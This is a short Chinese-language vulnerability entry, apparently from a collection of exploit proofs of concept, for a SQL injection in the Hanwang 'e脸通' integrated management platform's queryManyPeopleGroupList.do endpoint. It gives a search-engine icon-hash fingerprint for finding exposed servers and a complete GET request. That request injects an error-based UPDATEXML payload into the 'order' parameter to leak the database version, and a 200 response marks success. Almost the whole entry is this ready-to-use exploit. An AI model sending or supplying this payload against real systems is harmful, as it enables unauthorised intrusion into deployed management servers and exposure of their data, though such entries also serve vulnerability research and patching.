# 汉王e脸通综合管理平台queryManyPeopleGroupList.doSQL注入漏洞

汉王e脸通综合管理平台queryManyPeopleGroupList.do ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="1380907357"`
- **请求**：`GET /manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1`
- **响应特征**：200